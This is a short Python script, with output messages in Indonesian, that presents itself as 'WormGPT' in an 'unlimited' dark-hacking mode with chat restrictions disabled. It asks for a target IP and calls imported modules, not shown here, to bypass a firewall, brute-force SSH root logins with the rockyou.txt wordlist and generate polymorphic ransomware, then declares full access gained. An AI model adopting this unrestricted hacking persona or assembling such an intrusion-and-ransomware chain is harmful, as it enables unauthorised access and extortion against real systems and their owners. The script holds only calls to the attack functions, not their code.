import sys
import os
import core.hacker_engine as he
import core.malware_gen as mg
import core.bypass as bypass

def main():
    print("[+] WormGPT-Temux Unlimited Mode: AKTIF")
    print("[+] Batasan Chat: DINONAKTIFKAN")
    print("[+] Mode: Dark Hacking")
    
    target = input("\n[Masukkan IP Target]: ")
    if not target:
        target = "127.0.0.1" # Default loopback untuk testing
    
    print(f"\n[*] Menjalankan bypass firewall pada {target}...")
    bypass.silent_bypass(target)
    
    print("[*] Memulai Brute-Force SSH...")
    he.brute_force_ssh(target, user="root", pass_list="rockyou.txt")
    
    print("[*] Menggenerate Payload Polymorphic Ransomware...")
    mg.generate_ransomware(payload_type="worm", encryption="AES-256", target=target)
    
    print("\n[+] SERANGAN BERHASIL. AKSES PENUH DITERIMA.")
    print("[+] Menunggu perintah selanjutnya...")

if __name__ == "__main__":
    main()

